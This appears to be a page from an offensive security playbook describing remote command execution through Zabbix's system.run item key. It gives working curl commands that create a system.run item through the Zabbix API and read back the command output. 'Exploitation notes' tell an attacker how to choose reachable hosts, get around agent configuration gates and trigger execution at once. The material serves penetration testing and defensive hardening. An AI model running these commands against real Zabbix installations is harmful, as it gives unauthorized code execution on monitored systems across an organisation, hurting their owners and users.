---
title: "Item command execution: system.run and command items"
order: 1
description: "Zabbix items with the system.run key run a shell command on the Zabbix agent when the item is checked, and command-type items similarly execute. An attacker with rights to create or modify items on a host adds a system.run item and triggers its evaluation, executing commands on the agent host, which is a monitored system across the estate."
keywords:
  - system.run
  - item key
  - zabbix agent
  - command item
  - rce
---

# Item command execution

A Zabbix item defines what to collect, and the `system.run[command,mode]` item key runs an arbitrary shell command on the target host's Zabbix agent when the item is evaluated. An attacker with permission to create or modify items on a host (through the UI or the API's `item.create`/`item.update`) adds a `system.run` item pointing at their command, then forces or waits for its evaluation, and the command executes on that agent's host. Because the agent runs on monitored systems throughout the environment, this is a path to code execution on many hosts, not just the Zabbix server, limited to the hosts the attacker's role can configure and whose agents permit `system.run`.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# create a system.run item on a host (hostid from host.get), then check it
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.create","params":{
  "name":"x","key_":"system.run[id]","hostid":"<HOSTID>","type":0,
  "value_type":4,"interfaceid":"<IFID>","delay":"10s"},"auth":"'"$TOK"'","id":1}'
# trigger immediate evaluation (task.create ExecuteNow) or wait for the delay, then read the value
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"item.get","params":{"search":{"key_":"system.run"},"output":["lastvalue"]},"auth":"'"$TOK"'","id":1}'
```

## Exploitation notes

- The command runs on the agent host (not the server), so this reaches monitored systems across the estate, pick a host whose agent you can configure and that permits `system.run`.
- Agents gate `system.run`: older agents need `EnableRemoteCommands=1`, newer agents need an `AllowKey=system.run[*]` (denied by default), so execution depends on the agent's config, see [Agent remote commands](agent-remote-commands.md).
- The command output is captured as the item's value (`value_type` text), so you read results back through `item.get lastvalue`; use `task.create` (ExecuteNow) to trigger immediately rather than waiting for the poll.
- This requires item-configuration rights on the target host; a Super admin has them everywhere, while a limited role may only reach some hosts.

## References

- [Zabbix: system.run agent item](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent)
- [HackTricks: Zabbix](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
